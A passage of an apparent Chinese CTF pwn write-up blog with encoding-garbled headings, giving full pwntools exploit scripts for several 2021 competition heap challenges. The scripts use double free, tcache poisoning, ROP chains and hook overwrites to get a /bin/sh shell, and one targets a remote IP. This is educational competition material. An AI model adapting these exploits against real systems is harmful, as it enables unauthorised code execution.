<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;pwdFree&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwdFree&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input Your Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input The ID You Want Save:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Length Of Your Pwd:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Pwd:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input Your Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input Your Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Which PwdBox You Want Check:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input Your Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Idx you want 2 Delete:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Save ID:&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#0 (7)</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#1  (8)</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#2 (9)</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#3  (10)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>) </span><br><span class="line">free(<span class="number">7</span>)  <span class="comment"># -&gt;unsortdebin</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64((<span class="number">0x80</span>+<span class="number">0x100</span>)^key)) <span class="comment">#0</span></span><br><span class="line">free(<span class="number">9</span>)   <span class="comment">#unlink </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#overlap</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;is: &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) ^ key </span><br><span class="line">libc_base -= <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#one = [0x4f3d5,0x4f432,0x10a41c]</span></span><br><span class="line">binsh = u64(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#tacahe check bypass</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">3</span>)   <span class="comment">#double free</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook^key))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system^key))</span><br><span class="line">add(<span class="number">0x60</span>,p64(binsh^key))</span><br><span class="line">free(<span class="number">5</span>) </span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2021-PWN4"><a class="header-anchor" href="#CISCN-2021-PWN4">Â¶</a>[CISCN 2021]PWN4</h2>
<h3 id="é¢˜ç›®è§£æ"><a class="header-anchor" href="#é¢˜ç›®è§£æ">Â¶</a>é¢˜ç›®è§£æ</h3>
<p>å…·ä½“è§æˆ‘å‰é¢UAFçš„æ–‡ç« </p>
<h3 id="exp-v7"><a class="header-anchor" href="#exp-v7">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p  = process(<span class="string">&quot;crash&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;crash&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;192.168.43.181&#x27;,55000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;add &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Pls give data size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Are you sure?:&#x27;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x0b\x00&#x27;</span>) </span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xd0b</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000000119c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000a80 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000929 : ret</span></span><br><span class="line"><span class="string">0x0000000000000962 : ret 0x2016</span></span><br><span class="line"><span class="string">0x000000000000102b : ret 0x8b48</span></span><br><span class="line"><span class="string">0x0000000000000dd2 : ret 0x8d48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = elf_base + <span class="number">0x11a3</span></span><br><span class="line">puts_plt = elf_base + elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf_base + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf_base + elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_4 = elf_base + <span class="number">0x119c</span></span><br><span class="line">read_got = elf_base + elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_6 = elf_base + <span class="number">0x119a</span></span><br><span class="line">rop2 = elf_base + <span class="number">0x1180</span></span><br><span class="line">bin_sh = elf_base + <span class="number">0x202080</span> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4))</span><br><span class="line">payload1 = p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_6)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">8</span>)+p64(bin_sh)+p64(<span class="number">0</span>)+p64(rop2)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">56</span>+p64(main)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;yes\x00\x00\x00\x00\x00&quot;</span> + payload1</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4))</span><br><span class="line"></span><br><span class="line">payload2 = p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(main)</span><br><span class="line">payload2 = <span class="string">b&#x27;yes&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + payload2</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="é•¿å®‰æ¯-2021å­¦ç”Ÿç»„-baige"><a class="header-anchor" href="#é•¿å®‰æ¯-2021å­¦ç”Ÿç»„-baige">Â¶</a>[é•¿å®‰æ¯ 2021å­¦ç”Ÿç»„]baige</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v4"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v4">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>1.unsorted bin attact 
2.é€»è¾‘æ¼æ´
</code></pre>
<h3 id="IDA-åˆ†æ-v2"><a class="header-anchor" href="#IDA-åˆ†æ-v2">Â¶</a>IDA åˆ†æ</h3>
<p>æœ¬é¢˜åŠŸèƒ½add,show,edit,deleteä¸€åº”ä¿±å…¨</p>
<p>æ¼æ´ç‚¹åœ¨addå‡½æ•°ä¸­</p>
<p><img src="http://static.zybuluo.com/hgggg/8o7absc9hgkjttq01vk27xh9/2.png" alt="6.png-37.4kB"></p>
<p>add å‡½æ•°ç”¨ä¸€ä¸ªæ•°ç»„æ¥å‚¨å­˜sizeï¼Œ<strong>è€Œä¸”åœ¨è¿›å…¥æ£€æŸ¥ä¹‹å‰å°±ä¼šå¯¹æ•°ç»„ä¸­çš„å€¼èµ‹å€¼</strong>ï¼Œè¿™å°±æ„å‘³ç€æˆ‘å¯ä»¥åˆ©ç”¨è¿™ç‚¹æ¥ä¿®æ”¹å·²ç»ç”³è¯·åˆ°çš„å †å—çš„å¤§å°é€ æˆå †æº¢å‡º</p>
<h3 id="è§£é¢˜æ€è·¯"><a class="header-anchor" href="#è§£é¢˜æ€è·¯">Â¶</a>è§£é¢˜æ€è·¯</h3>
<p>Step1: leak libc<br>
æœ¬é¢˜é¢˜ç›®ç¯å¢ƒä½2.27éœ€è¦å¡«æ»¡tacahe,æ¥Unsorted bin attack</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x88</span>,<span class="string">b&#x27;aaa&#x27;</span>)  <span class="comment">#é˜²æ­¢åˆå¹¶</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x18</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa\n&#x27;</span>)</span><br><span class="line">libc_base = (u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span>) -<span class="number">0x3ebd00</span></span><br></pre></td></tr></table></figure>
<p>Step2: åˆ©ç”¨é€»è¾‘æ¼æ´åˆ¶é€ å †æº¢å‡ºï¼Œæ‰“free_hookæ¥getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;100000&quot;</span>)</span><br><span class="line">payload= p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">edit(<span class="number">9</span>,<span class="number">0x40</span>,payload)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x18</span>,p64(system))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x18</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br></pre></td></tr></table></figure>
<h3 id="exp-v8"><a class="header-anchor" href="#exp-v8">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;fff&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content?&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content?&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x88</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x18</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa\n&#x27;</span>)</span><br><span class="line">libc_base = (u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span>) -<span class="number">0x3ebd00</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook =  libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;100000&quot;</span>)</span><br><span class="line">payload= p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">edit(<span class="number">9</span>,<span class="number">0x40</span>,payload)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x18</span>,p64(system))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x18</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-ç¥¥äº‘æ¯-note"><a class="header-anchor" href="#2021-ç¥¥äº‘æ¯-note">Â¶</a>[2021 ç¥¥äº‘æ¯]note</h2>
<h3 id="é¢˜ç›®åˆ†æ-v2"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ-v2">Â¶</a>é¢˜ç›®åˆ†æ</h3>
<p>å…·ä½“åˆ†æè§æˆ‘house of orange é‚£ç¯‡ç¬”è®°</p>
<h3 id="exp-v9"><a class="header-anchor" href="#exp-v9">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;ggg&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28009</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">  p.sendafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">content1,content2</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;say ? &quot;</span>)</span><br><span class="line">  p.send(content1)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;? &quot;</span>)</span><br><span class="line">  p.sendline(content2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr: &#x27;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">top_chunk = heap_addr + <span class="number">0x30</span></span><br><span class="line">top_size = top_chunk + <span class="number">8</span></span><br><span class="line">say(<span class="string">b&#x27;%7$daaaa&#x27;</span>+p64(top_size),<span class="built_in">str</span>(<span class="number">0xfc1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4c28</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">one_gadgets = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">one = libc_base + one_gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">say(<span class="string">b&#x27;%7$saaaa&#x27;</span>+p64(malloc_hook-<span class="number">8</span>),p64(one)+p64(realloc+<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="PasswordBox-ProVersion"><a class="header-anchor" href="#PasswordBox-ProVersion">Â¶</a>PasswordBox ProVersion</h2>
